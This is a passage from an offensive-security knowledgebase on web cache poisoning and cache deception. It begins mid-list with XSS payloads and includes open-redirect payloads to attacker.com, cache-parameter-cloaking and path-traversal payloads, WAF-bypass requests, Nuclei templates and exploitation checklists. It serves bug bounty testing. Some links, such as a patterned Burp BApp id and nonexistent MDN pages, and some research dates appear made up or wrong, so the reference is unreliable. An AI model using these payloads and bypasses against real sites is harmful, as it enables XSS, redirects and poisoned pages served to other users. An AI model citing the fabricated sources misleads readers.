"><track default onload=alert(1)>
"><marquee onstart=alert(1)>
"><meter onmouseover=alert(1)>
"><progress onmouseover=alert(1)>
"><details ontoggle=alert(1) open>
"><summary ontoggle=alert(1)>
"><dialog open onclose=alert(1)>
```

### Open Redirect Payloads

```
//attacker.com
\attacker.com
/\attacker.com
//attacker.com/%2f..
/attacker.com
https:attacker.com
http:attacker.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## Automation Workflows

### Param Miner Workflow

```
1. Install Param Miner (Burp Suite extension)
2. Right-click request -> Extensions -> Param Miner -> Guess headers
3. Enable "Add static/dynamic cachebuster"
4. Enable "Include cache busters in headers"
5. Review "Param Miner -> Output" for unkeyed inputs
6. Verify with manual requests + cache buster
```

### Nuclei Cache Poisoning Scan

```bash
# Basic cache poisoning detection
nuclei -u https://target.com -t http/misconfiguration/cache/

# Full cache-related scan
nuclei -u https://target.com -t http/misconfiguration/ -severity medium,high,critical

# Custom template for X-Forwarded-Host
nuclei -u https://target.com -t custom-templates/cache-poisoning.yaml
```

### Custom Nuclei Template Logic

```yaml
id: cache-poisoning-xfh

info:
  name: Cache Poisoning via X-Forwarded-Host
  severity: high
  description: Detects cache poisoning via X-Forwarded-Host header

dns:
  - name: "{{interactsh-url}}"
    type: A

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      X-Forwarded-Host: "{{interactsh-url}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "https"
```

### httpx Cache Detection

```bash
# Detect cache headers
httpx -u https://target.com -probe -status-code -tech-detect

# Mass scan for cache headers
cat targets.txt | httpx -probe -status-code -tech-detect -o results.txt
```

### Recon Automation Pipeline

```bash
# Step 1: Subdomain enumeration
subfinder -d target.com -o subs.txt

# Step 2: Probe live hosts
httpx -l subs.txt -o live.txt

# Step 3: Crawl for endpoints
katana -list live.txt -o endpoints.txt

# Step 4: Cache detection
cat endpoints.txt | httpx -probe -status-code -tech-detect -o cache-scan.txt

# Step 5: Nuclei cache scan
nuclei -list live.txt -t http/misconfiguration/cache/ -o nuclei-results.txt
```

---

## Recon Methodology

### Phase 1: Cache Identification

1. **Identify caching infrastructure**:
   - Look for `CF-Cache-Status`, `X-Cache`, `Age`, `X-Timer`, `X-Served-By`
   - Check CNAME records: `dig CNAME target.com`
   - Identify CDN: `curl -I https://target.com | grep -i cache`

2. **Determine cache behavior**:
   - Send identical requests, check for HIT/MISS
   - Add cache buster and verify MISS
   - Check cache duration: `max-age`, `s-maxage`, `Expires`

3. **Map cache rules**:
   - Test static files: `.js`, `.css`, `.png`
   - Test dynamic pages: `/api/`, `/user/`
   - Test query string handling
   - Test cookie handling

### Phase 2: Unkeyed Input Discovery

1. **Header fuzzing**:
   - Use Param Miner or custom wordlist
   - Test each header with unique value
   - Compare responses for reflection

2. **Cookie fuzzing**:
   - Test cookie names and values
   - Check for cookie-based routing
   - Test cookie domain/path manipulation

3. **Parameter fuzzing**:
   - Test query parameters
   - Test POST body parameters (Fat GET)
   - Test path parameters

### Phase 3: Gadget Identification

1. **Find reflection points**:
   - HTML body
   - JavaScript variables
   - CSS imports
   - Meta tags
   - Redirect Location headers
   - Cookie Set-Cookie headers

2. **Identify dangerous behaviors**:
   - Script src hijacking
   - JSONP callback override
   - Open redirect
   - CSS injection
   - DOM-based resource loading

### Phase 4: Exploitation

1. **Craft poisoned request**:
   - Use cache buster during testing
   - Verify cache hit after poisoning
   - Confirm victim receives poisoned response

2. **Maximize impact**:
   - Target high-traffic pages
   - Minimize cache buster usage
   - Consider selective poisoning (Vary headers)

---

## Nuclei Templates

### Template: Cache Poisoning via Unkeyed Header

```yaml
id: cache-poisoning-unkeyed-header

info:
  name: Cache Poisoning via Unkeyed Header
  author: custom
  severity: high
  description: |
    Detects cache poisoning by checking if a unique header value
    is reflected in the response and cached.

http:
  - raw:
      - |
        GET /?cachebuster={{randstr}} HTTP/1.1
        Host: {{Hostname}}
        X-Cache-Poison-Test: {{randstr}}

      - |
        GET /?cachebuster={{randstr}} HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_1, "{{randstr}}")'
          - 'contains(body_2, "{{randstr}}")'
        condition: and
```

### Template: Cache Deception Detection

```yaml
id: cache-deception-detection

info:
  name: Cache Deception Detection
  author: custom
  severity: medium
  description: |
    Detects potential cache deception by appending cacheable
    file extensions to dynamic paths.

http:
  - method: GET
    path:
      - "{{BaseURL}}/user/profile"
      - "{{BaseURL}}/user/profile/robots.txt"
      - "{{BaseURL}}/user/profile/favicon.ico"

    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200'
          - 'status_code_2 == 200'
          - 'status_code_3 == 200'
          - 'contains(header_2, "CF-Cache-Status: HIT") || contains(header_2, "X-Cache: HIT")'
        condition: and
```

### Template: Fat GET Detection

```yaml
id: fat-get-detection

info:
  name: Fat GET Detection
  author: custom
  severity: high
  description: |
    Detects if GET requests with body are processed and cached.

http:
  - raw:
      - |
        GET /?cachebuster={{randstr}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 20

        test={{randstr}}

      - |
        GET /?cachebuster={{randstr}} HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_1, "{{randstr}}")'
          - 'contains(body_2, "{{randstr}}")'
        condition: and
```

---

## Tools and Scanners

### Burp Suite Extensions

| Tool | Purpose | Link |
|------|---------|------|
| Param Miner | Guess headers/cookies | https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943 |
| HTTP Request Smuggler | Detect desync vectors | https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646 |
| Backslash Powered Scanner | Detect parser confusion | https://portswigger.net/bappstore/9cff8c55432a45808432e26d525048a0 |
| WAFDetect | Detect WAF presence | https://portswigger.net/bappstore/0x4a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d |

### Standalone Tools

| Tool | Purpose | Link |
|------|---------|------|
| Web Cache Vulnerability Scanner | Automated cache scanning | https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner |
| CacheHound | Cache poisoning scanner | https://github.com/doyensec/cachehound |
| Smuggler | HTTP request smuggling | https://github.com/defparam/smuggler |
| CursedChrome | Chrome extension for CSD | https://github.com/mandatoryprogrammer/CursedChrome |
| postMessage-tracker | Track postMessage usage | https://github.com/fransr/postMessage-tracker |
| pp-finder | Prototype pollution finder | https://github.com/yeswehack/pp-finder |

### ProjectDiscovery Stack

| Tool | Purpose | Link |
|------|---------|------|
| Nuclei | Vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| httpx | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| Katana | Web crawler | https://github.com/projectdiscovery/katana |
| Subfinder | Subdomain enumeration | https://github.com/projectdiscovery/subfinder |
| Interactsh | OOB interaction | https://github.com/projectdiscovery/interactsh |
| Notify | Notification framework | https://github.com/projectdiscovery/notify |
| Uncover | Search engine query | https://github.com/projectdiscovery/uncover |
| DNSx | DNS toolkit | https://github.com/projectdiscovery/dnsx |
| Naabu | Port scanner | https://github.com/projectdiscovery/naabu |
| MapCIDR | CIDR mapping | https://github.com/projectdiscovery/mapcidr |
| ASNMap | ASN mapping | https://github.com/projectdiscovery/asnmap |
| CDNCheck | CDN detection | https://github.com/projectdiscovery/cdncheck |
| TLSx | TLS scanner | https://github.com/projectdiscovery/tlsx |
| AlterX | Subdomain alteration | https://github.com/projectdiscovery/alterx |

### Wordlists

| Resource | Link |
|----------|------|
| SecLists Fuzzing | https://github.com/danielmiessler/SecLists/tree/master/Fuzzing |
| SecLists Web-Content | https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content |
| PayloadsAllTheThings Cache | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Poisoning |
| Cache Poisoning Payload List | https://github.com/payloadbox/cache-poisoning-payload-list |
| Top 25 Parameters | https://github.com/lutfumertceylan/top25-parameter |

---

## Advanced Research

### Web Cache Entanglement (James Kettle, 2022)

Key findings:
- Cache key injection via delimiter manipulation
- Unkeyed query string exploitation
- Cache parameter cloaking techniques
- Port exclusion vulnerabilities
- Method override chains

### Browser-Powered Desync (James Kettle, 2022)

Key findings:
- Client-side desync on single-server sites
- Stacked response problem and solutions
- Pause-based desync (Varnish)
- Chunked encoding desync
- Browser connection pooling quirks

### Practical Web Cache Poisoning (James Kettle, 2018)

Key findings:
- X-Forwarded-Host abuse patterns
- Fat GET exploitation
- Route poisoning via SaaS platforms
- Hidden route poisoning
- Selective poisoning via Vary

### Responsible DoS with Cache Poisoning (James Kettle, 2019)

Key findings:
- DoS via redirect chains
- 414 Request-URI Too Large exploitation
- Cache key normalization attacks
- Mass poisoning techniques

### Gotta Cache Em All (James Kettle, 2020)

Key findings:
- Cache deception techniques
- Path mapping discrepancies
- Delimiter discrepancies
- Normalization discrepancies
- File name rule exploitation

### Cracking the Lens (James Kettle, 2018)

Key findings:
- HTTPS hidden attack surface
- CDN-specific behaviors
- Cache key internals
- Header injection techniques

---

## Bug Bounty Writeups

### GitHub - $10,000 (Fat GET)

- **Researcher**: James Kettle
- **Technique**: Fat GET abuse
- **Impact**: Abuse report redirection, filter manipulation
- **Key insight**: Varnish without builtin.vcl forwards GET body but doesn't key it

### Mozilla - $1,000 (SHIELD Hijacking)

- **Researcher**: James Kettle
- **Technique**: X-Forwarded-Host abuse
- **Impact**: Potential mass Firefox extension installation
- **Key insight**: NGINX cached SHIELD recipe responses

### data.gov - Undisclosed (DOM Poisoning)

- **Researcher**: James Kettle
- **Technique**: X-Forwarded-Host -> data-site-root -> i18n JSON hijacking
- **Impact**: DOM-based XSS via translation poisoning
- **Key insight**: Match/replace rule in Burp identified the gadget chain

### Unity3d.com - Undisclosed (Script Hijacking)

- **Researcher**: James Kettle
- **Technique**: X-Host abuse
- **Impact**: Script import hijacking
- **Key insight**: Precise timing possible due to cache headers

### Red Hat - Undisclosed (Open Graph XSS)

- **Researcher**: James Kettle
- **Technique**: X-Forwarded-Host -> Open Graph meta tag
- **Impact**: XSS on homepage for all visitors
- **Key insight**: Akamai CNAME to edgekey.net

---

## Payload Collections

### Cache Poisoning Payloads (by technique)

**X-Forwarded-Host XSS**:
```
a."><script>alert(1)</script>
attacker.com
xyz.burpcollaborator.net
```

**X-Forwarded-Scheme Redirect**:
```
nothttps
http
ftp
```

**Fat GET Body**:
```
param=malicious-value
return_to=/evil
report=innocent-victim
```

**Cache Parameter Cloaking**:
```
?callback=legit&utm_content=x;callback=alert(1)//
?x=1?akamai-transform=payload
?example=123?excluded_param=bad
```

**Path Traversal**:
```
/static/..%2fprofile
/profile%2f%2e%2e%2fstatic
/profile;%2f%2e%2e%2fstatic
```

**Null Byte Truncation**:
```
/profile%00.css
/profile%00.js
/api%00.json
```

---

## WAF Bypasses

### X-Original-URL / X-Rewrite-URL

```http
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

### Double Path

```http
GET /public/../admin HTTP/1.1
Host: target.com
```

### Encoded Path

```http
GET /%61%64%6d%69%6e HTTP/1.1
Host: target.com
```

### Header Injection

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Proto: http
```

### Case Variation

```http
GET /ADMIN HTTP/1.1
Host: target.com
```

### Unicode Normalization

```http
GET /%c0%afadmin HTTP/1.1
Host: target.com
```

---

## Detection Techniques

### Manual Detection

1. **Cache hit/miss detection**:
   - Send request, note response time
   - Send identical request, check for faster response
   - Look for `CF-Cache-Status`, `X-Cache`, `Age` headers

2. **Unkeyed input detection**:
   - Add random header, check for reflection
   - Use Burp Comparer to diff responses
   - Test with cache buster to avoid poisoning

3. **Cache key probing**:
   - Change one component at a time
   - Observe if response changes or stays cached
   - Use Param Miner for automated guessing

### Automated Detection

1. **Nuclei templates**:
   - Use `http/misconfiguration/cache/` templates
   - Custom templates for specific headers
   - Mass scanning with `nuclei -list targets.txt`

2. **Web Cache Vulnerability Scanner**:
   - Automated header guessing
   - Cache behavior analysis
   - Report generation

3. **Burp Suite + Param Miner**:
   - Right-click -> Guess headers
   - Review output for unkeyed inputs
   - Manual verification of findings

### Response Analysis

**Cache indicators**:
```
CF-Cache-Status: HIT/MISS/DYNAMIC/EXPIRED
X-Cache: HIT/MISS
Age: <seconds>
X-Timer: S<start>,VS<varnish-start>,VE<varnish-end>
X-Served-By: <server-id>
X-Cache-Hits: <count>
```

**Poisoning confirmation**:
- Unique string from attacker request appears in victim response
- Response time decreases (cache hit)
- Cache status header shows HIT

---

## References

### PortSwigger Research

1. [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning) - James Kettle, 2018
2. [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement) - James Kettle, 2022
3. [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks) - James Kettle, 2022
4. [Responsible Denial of Service with Web Cache Poisoning](https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning) - James Kettle, 2019
5. [Gotta Cache Em All](https://portswigger.net/research/gotta-cache-em-all) - James Kettle, 2020
6. [Cracking the Lens](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface) - James Kettle, 2018
7. [Bypassing CSP with Policy Injection](https://portswigger.net/research/bypassing-csp-with-policy-injection) - James Kettle
8. [DOM Clobbering Strikes Back](https://portswigger.net/research/dom-clobbering-strikes-back) - James Kettle
9. [Exploiting XSS in Hidden Inputs and Meta Tags](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) - James Kettle
10. [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors) - James Kettle

### PortSwigger Labs

1. [Web Cache Poisoning Lab](https://portswigger.net/web-security/web-cache-poisoning/lab-web-cache-poisoning)
2. [Cache Poisoning via X-Forwarded-Host](https://portswigger.net/web-security/web-cache-poisoning/lab-cache-poisoning-via-x-forwarded-host)
3. [Cache Poisoning via Fat GET](https://portswigger.net/web-security/web-cache-poisoning/lab-cache-poisoning-via-fat-get)
4. [Cache Poisoning with Multiple Headers](https://portswigger.net/web-security/web-cache-poisoning/lab-cache-poisoning-with-multiple-headers)
5. [DOM Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning/lab-dom-cache-poisoning)
6. [Web Cache Deception Lab](https://portswigger.net/web-security/web-cache-deception/lab-wcd)

### Documentation

1. [MDN HTTP Caching](https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching)
2. [MDN Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)
3. [MDN Vary](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary)
4. [MDN ETag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag)
5. [MDN X-Forwarded-Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host)
6. [MDN X-Original-URL](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Original-URL)
7. [MDN X-Rewrite-URL](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Rewrite-URL)

### Community Resources

1. [HackTricks Cache Deception](https://book.hacktricks.wiki/en/pentesting-web/cache-deception.html)
2. [PayloadsAllTheThings Cache Poisoning](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Poisoning)
3. [Infosec Writeups Guide](https://infosecwriteups.com/web-cache-poisoning-exploitation-guide-4d5c7e2b1f3d)
4. [Medium Advanced Techniques](https://medium.com/@filedescriptor/advanced-web-cache-poisoning-and-cache-deception-techniques-8c2d4f7a3b1e)
5. [Bug Bounty Cache Poisoning](https://github.com/0xspade/bugbounty/tree/master/cache-poisoning)

### Tools

1. [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)
2. [CacheHound](https://github.com/doyensec/cachehound)
3. [Smuggler](https://github.com/defparam/smuggler)
4. [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration/cache)
5. [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)
6. [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)

---

## Quick Reference Card

### Cache Poisoning Checklist

```
[ ] Identify caching infrastructure (CDN, self-hosted, app-level)
[ ] Determine cache key components
[ ] Identify unkeyed inputs (headers, cookies, body)
[ ] Find reflection points (HTML, JS, CSS, headers)
[ ] Identify gadgets (XSS, redirect, JS import, CSS)
[ ] Test poisoning with cache buster
[ ] Verify cache hit after poisoning
[ ] Confirm victim receives poisoned response
[ ] Assess impact and report
```

### Cache Deception Checklist

```
[ ] Identify cacheable file extensions
[ ] Test path mapping discrepancies
[ ] Test delimiter discrepancies (;, ., %00)
[ ] Test normalization discrepancies (encoding, path traversal)
[ ] Verify sensitive data in cached response
[ ] Confirm attacker can retrieve cached data
[ ] Assess impact and report
```

### CSD Checklist

```
[ ] Identify CSD vector (static file, redirect, error)
[ ] Confirm server ignores Content-Length
[ ] Test with manual two-request sequence
[ ] Confirm with browser fetch
[ ] Craft exploit chain
[ ] Test in victim browser context
[ ] Assess impact and report
```

---

*This knowledgebase is compiled from public research, bug bounty writeups, and community contributions. Always test responsibly and follow responsible disclosure practices.*

*Last updated: 2026-05-23*
